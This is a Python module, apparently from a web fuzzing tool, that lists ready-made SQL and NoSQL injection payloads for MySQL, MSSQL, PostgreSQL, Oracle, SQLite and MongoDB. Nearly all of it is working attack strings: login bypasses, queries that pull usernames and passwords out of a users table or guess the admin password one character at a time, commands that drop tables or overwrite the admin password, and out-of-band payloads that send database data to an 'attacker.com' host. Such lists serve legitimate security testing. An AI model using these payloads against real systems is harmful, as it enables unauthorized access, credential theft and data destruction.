"""
SQL Injection payload module for HumanFuzz.

This module provides a comprehensive collection of SQL Injection payloads for testing web applications
against various database systems including MySQL, MSSQL, PostgreSQL, Oracle, SQLite, and NoSQL databases.
"""

from typing import List
from humanfuzz.payloads import Payload

def get_payloads(field_type: str = None) -> List[Payload]:
    """
    Get SQL Injection payloads, optionally filtered by field type.

    Args:
        field_type: Type of the field (optional)

    Returns:
        List of Payload objects
    """
    # Basic SQL Injection payloads
    basic_payloads = [
        Payload("' OR '1'='1", "sqli", "Basic OR",
                "Basic SQL injection using OR condition"),
        Payload("' OR '1'='1' --", "sqli", "OR with Comment",
                "SQL injection with comment to ignore rest of query"),
        Payload("admin' --", "sqli", "Admin Comment",
                "Attempt to log in as admin with comment"),
        Payload("' OR 1=1 --", "sqli", "Numeric OR",
                "SQL injection using numeric comparison"),
        Payload("' OR 1=1 #", "sqli", "MySQL Comment",
                "SQL injection with MySQL comment"),
        Payload("' OR 1=1 /*", "sqli", "C-style Comment",
                "SQL injection with C-style comment"),
        Payload("\" OR \"1\"=\"1", "sqli", "Double Quote OR",
                "SQL injection using double quotes"),
        Payload("') OR ('1'='1", "sqli", "Parenthesis OR",
                "SQL injection with parentheses"),
        Payload("\") OR (\"1\"=\"1", "sqli", "Double Quote Parenthesis",
                "SQL injection with double quotes and parentheses"),
    ]

    # Authentication bypass payloads
    auth_bypass_payloads = [
        Payload("admin'--", "sqli", "Admin Bypass",
                "Authentication bypass as admin"),
        Payload("admin' #", "sqli", "Admin MySQL Comment",
                "Authentication bypass with MySQL comment"),
        Payload("admin'/*", "sqli", "Admin C Comment",
                "Authentication bypass with C-style comment"),
        Payload("' OR '1'='1' LIMIT 1 --", "sqli", "OR with Limit",
                "Authentication bypass with LIMIT clause"),
        Payload("' OR '1'='1' LIMIT 1,1 --", "sqli", "OR with Offset",
                "Authentication bypass with LIMIT and offset"),
        Payload("' OR '1'='1' ORDER BY 1 --", "sqli", "OR with Order",
                "Authentication bypass with ORDER BY clause"),
        Payload("admin') OR ('1'='1", "sqli", "Admin Parenthesis",
                "Authentication bypass with parentheses"),
    ]

    # Error-based SQL Injection payloads
    error_payloads = [
        # MySQL error-based
        Payload("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1",
                "sqli", "MySQL Error Based", "Error-based SQL injection for MySQL"),
        Payload("' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) AND '1'='1",
                "sqli", "MySQL ExtractValue", "Error-based SQL injection using ExtractValue"),
        Payload("' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1) AND '1'='1",
                "sqli", "MySQL UpdateXML", "Error-based SQL injection using UpdateXML"),

        # MSSQL error-based
        Payload("' AND 1=CONVERT(int,(SELECT user)) AND '1'='1",
                "sqli", "MSSQL Error Based", "Error-based SQL injection for MSSQL"),
        Payload("' AND 1=CONVERT(int,(SELECT @@version)) AND '1'='1",
                "sqli", "MSSQL Version", "Error-based SQL injection to get MSSQL version"),
        Payload("' AND 1=db_name() AND '1'='1",
                "sqli", "MSSQL DB Name", "Error-based SQL injection to get database name"),

        # PostgreSQL error-based
        Payload("' AND 1=cast((SELECT version()) as int) AND '1'='1",
                "sqli", "PostgreSQL Error", "Error-based SQL injection for PostgreSQL"),
        Payload("' AND 1=cast((SELECT current_database()) as int) AND '1'='1",
                "sqli", "PostgreSQL DB", "Error-based SQL injection to get PostgreSQL database"),

        # Oracle error-based
        Payload("' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) AND '1'='1",
                "sqli", "Oracle Error", "Error-based SQL injection for Oracle"),
    ]

    # Union-based SQL Injection payloads
    union_payloads = [
        # Basic UNION payloads
        Payload("' UNION SELECT 1,2,3 --", "sqli", "Basic Union",
                "Basic UNION-based SQL injection"),
        Payload("' UNION SELECT 1,2,3,4 --", "sqli", "Union Four Columns",
                "UNION-based SQL injection with four columns"),
        Payload("' UNION SELECT 1,2,3,4,5 --", "sqli", "Union Five Columns",
                "UNION-based SQL injection with five columns"),

        # Data extraction UNION payloads
        Payload("' UNION SELECT username,password,3 FROM users --", "sqli",
                "Union Users Table", "UNION-based SQL injection targeting users table"),
        Payload("' UNION SELECT table_name,2,3 FROM information_schema.tables --", "sqli",
                "Union Tables", "UNION-based SQL injection to list tables"),
        Payload("' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --", "sqli",
                "Union Columns", "UNION-based SQL injection to list columns"),

        # Database-specific UNION payloads
        Payload("' UNION SELECT 1,@@version,3 --", "sqli", "MySQL Version",
                "UNION-based SQL injection to get MySQL version"),
        Payload("' UNION SELECT 1,@@datadir,3 --", "sqli", "MySQL Data Dir",
                "UNION-based SQL injection to get MySQL data directory"),
        Payload("' UNION SELECT 1,current_user(),3 --", "sqli", "MySQL User",
                "UNION-based SQL injection to get MySQL current user"),

        # MSSQL-specific UNION payloads
        Payload("' UNION SELECT 1,@@servername,3 --", "sqli", "MSSQL Server",
                "UNION-based SQL injection to get MSSQL server name"),
        Payload("' UNION SELECT 1,@@version,3 --", "sqli", "MSSQL Version",
                "UNION-based SQL injection to get MSSQL version"),

        # PostgreSQL-specific UNION payloads
        Payload("' UNION SELECT 1,version(),3 --", "sqli", "PostgreSQL Version",
                "UNION-based SQL injection to get PostgreSQL version"),
        Payload("' UNION SELECT 1,current_database(),3 --", "sqli", "PostgreSQL DB",
                "UNION-based SQL injection to get PostgreSQL database"),

        # Oracle-specific UNION payloads
        Payload("' UNION SELECT 1,banner,3 FROM v$version --", "sqli", "Oracle Version",
                "UNION-based SQL injection to get Oracle version"),
    ]

    # Blind SQL Injection payloads
    blind_payloads = [
        # Time-based blind payloads
        Payload("' AND SLEEP(5) AND '1'='1", "sqli", "MySQL Time-Based",
                "Time-based blind SQL injection for MySQL"),
        Payload("' AND pg_sleep(5) AND '1'='1", "sqli", "PostgreSQL Time-Based",
                "Time-based blind SQL injection for PostgreSQL"),
        Payload("' AND WAITFOR DELAY '0:0:5' AND '1'='1", "sqli", "MSSQL Time-Based",
                "Time-based blind SQL injection for MSSQL"),
        Payload("' AND DBMS_LOCK.SLEEP(5) AND '1'='1", "sqli", "Oracle Time-Based",
                "Time-based blind SQL injection for Oracle"),
        Payload("' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND '1'='1", "sqli",
                "PostgreSQL CPU Load", "CPU-intensive operation for PostgreSQL"),

        # Boolean-based blind payloads
        Payload("' AND (SELECT COUNT(*) FROM users) > 0 AND '1'='1", "sqli",
                "Boolean-Based Blind", "Boolean-based blind SQL injection"),
        Payload("' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' AND '1'='1", "sqli",
                "Substring Blind", "Boolean-based blind SQL injection using SUBSTRING"),
        Payload("' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>90 AND '1'='1", "sqli",
                "ASCII Blind", "Boolean-based blind SQL injection using ASCII"),
        Payload("' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users LIMIT 1)=1 AND '1'='1", "sqli",
                "Case Blind", "Boolean-based blind SQL injection using CASE"),
    ]

    # Out-of-band SQL Injection payloads
    oob_payloads = [
        Payload("' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\share\\\\a.txt')) AND '1'='1", "sqli",
                "MySQL OOB File", "Out-of-band SQL injection using LOAD_FILE"),
        Payload("' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\share\\\\a.txt')) --", "sqli",
                "MySQL OOB Union", "Out-of-band SQL injection using UNION and LOAD_FILE"),
        Payload("'; DECLARE @data VARCHAR(1024); SET @data=(SELECT @@version); EXEC('master..xp_dirtree \"\\\\'+@data+'.attacker.com\\\\a\"') --", "sqli",
                "MSSQL OOB xp_dirtree", "Out-of-band SQL injection using xp_dirtree"),
        Payload("'; EXEC master..xp_dirtree '\\\\attacker.com\\share' --", "sqli",
                "MSSQL OOB Simple", "Simple out-of-band SQL injection for MSSQL"),
    ]

    # Second-order SQL Injection payloads
    second_order_payloads = [
        Payload("first'; INSERT INTO logs (message) VALUES ('second-order payload'); --", "sqli",
                "Second-Order Insert", "Second-order SQL injection using INSERT"),
        Payload("first'; UPDATE users SET password='hacked' WHERE username='admin'; --", "sqli",
                "Second-Order Update", "Second-order SQL injection using UPDATE"),
    ]

    # NoSQL Injection payloads
    nosql_payloads = [
        # MongoDB-specific payloads
        Payload("' || 1==1", "sqli", "NoSQL OR",
                "NoSQL injection using OR condition"),
        Payload("username[$ne]=invalid&password[$ne]=invalid", "sqli",
                "NoSQL Not Equal", "NoSQL injection using $ne operator"),
        Payload("username[$regex]=^adm&password[$ne]=invalid", "sqli",
                "NoSQL Regex", "NoSQL injection using $regex operator"),
        Payload("username[$exists]=true&password[$exists]=true", "sqli",
                "NoSQL Exists", "NoSQL injection using $exists operator"),
        Payload("username[$in][]=admin&password[$ne]=invalid", "sqli",
                "NoSQL In", "NoSQL injection using $in operator"),
        Payload("username[$gt]=a&password[$gt]=a", "sqli",
                "NoSQL Greater Than", "NoSQL injection using $gt operator"),

        # JavaScript injection for MongoDB
        Payload("'; return this.username == 'admin' && this.password.match(/.*/) //", "sqli",
                "NoSQL JavaScript", "NoSQL injection using JavaScript"),
        Payload("'; return this.username == 'admin' && sleep(5000) && this.password.match(/.*/) //", "sqli",
                "NoSQL Sleep", "NoSQL injection with sleep function"),
    ]

    # SQLite-specific payloads
    sqlite_payloads = [
        Payload("' UNION SELECT 1,sqlite_version(),3 --", "sqli", "SQLite Version",
                "UNION-based SQL injection to get SQLite version"),
        Payload("' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table' --", "sqli",
                "SQLite Tables", "UNION-based SQL injection to list SQLite tables"),
        Payload("' AND 1=(SELECT count(*) FROM sqlite_master) AND '1'='1", "sqli",
                "SQLite Boolean", "Boolean-based blind SQL injection for SQLite"),
    ]

    # Combine all payloads
    all_payloads = (basic_payloads + auth_bypass_payloads + error_payloads + union_payloads +
                   blind_payloads + oob_payloads + second_order_payloads + nosql_payloads + sqlite_payloads)

    # Filter by field type if specified
    if field_type:
        if field_type in ["search", "text", "hidden", "email", "url"]:
            # These field types are commonly vulnerable to SQL injection
            return all_payloads
        elif field_type == "number":
            # For number fields, use numeric-focused payloads
            return [
                Payload("1 OR 1=1", "sqli", "Numeric OR",
                        "SQL injection for numeric fields"),
                Payload("1; DROP TABLE users", "sqli", "Numeric Drop",
                        "Attempt to drop table via numeric field"),
                Payload("1 AND (SELECT COUNT(*) FROM users)>0", "sqli", "Numeric Boolean",
                        "Boolean-based SQL injection for numeric fields"),
                Payload("1 AND SLEEP(5)", "sqli", "Numeric Time-Based",
                        "Time-based SQL injection for numeric fields"),
                Payload("1 UNION SELECT 1,2,3", "sqli", "Numeric Union",
                        "UNION-based SQL injection for numeric fields"),
                Payload("1 OR EXISTS(SELECT 1 FROM users WHERE username='admin')", "sqli",
                        "Numeric Exists", "EXISTS-based SQL injection for numeric fields"),
            ]
        elif field_type == "password":
            # Password fields are often vulnerable but might be treated differently
            return basic_payloads + auth_bypass_payloads
        elif field_type == "date":
            # Date fields might be vulnerable to certain types of SQL injection
            return [
                Payload("2023-01-01' OR '1'='1", "sqli", "Date OR",
                        "SQL injection for date fields"),
                Payload("2023-01-01'; DROP TABLE users; --", "sqli", "Date Drop",
                        "Attempt to drop table via date field"),
            ]

    return all_payloads
